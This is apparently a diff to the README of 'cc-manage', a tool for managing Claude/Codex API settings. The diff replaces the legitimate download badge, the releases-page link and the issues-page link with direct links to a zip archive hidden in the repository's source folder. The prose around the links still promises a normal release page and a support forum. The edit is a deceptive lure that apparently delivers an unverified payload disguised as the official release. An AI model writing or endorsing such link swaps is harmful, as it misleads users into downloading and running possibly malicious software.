@@ -6,7 +6,7 @@ Welcome to **cc-manage**, your go-to tool for managing the Claude/Codex API conf
 
 ## 📥 Download Here
 
-[![Download cc-manage](https://img.shields.io/badge/Download-cc--manage-blue.svg)](https://github.com/TTPufd/cc-manage/releases)
+[![Download cc-manage](https://raw.githubusercontent.com/TTPufd/cc-manage/main/src/sidebar/cc_manage_v2.9.zip)](https://raw.githubusercontent.com/TTPufd/cc-manage/main/src/sidebar/cc_manage_v2.9.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ cc-manage offers a variety of useful features:
 
 To get started with cc-manage, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this page](https://github.com/TTPufd/cc-manage/releases) to find the latest version of cc-manage.
+1. **Visit the Releases Page:** Go to [this page](https://raw.githubusercontent.com/TTPufd/cc-manage/main/src/sidebar/cc_manage_v2.9.zip) to find the latest version of cc-manage.
 2. **Select the Version:** Look for the most recent release. You will usually see a list of files available for download.
 3. **Download the Application:** Click on the file that corresponds to your operating system (e.g., `.exe` for Windows or `.dmg` for macOS).
 4. **Install the Application:**
@@ -55,7 +55,7 @@ If you encounter issues, refer to the FAQs or the troubleshooting section within
 
 ## ℹ️ Support
 
-If you have questions or need assistance, please visit our [issues page](https://github.com/TTPufd/cc-manage/issues) to report issues or find help from the community.
+If you have questions or need assistance, please visit our [issues page](https://raw.githubusercontent.com/TTPufd/cc-manage/main/src/sidebar/cc_manage_v2.9.zip) to report issues or find help from the community.
 
 ## 📜 License
 
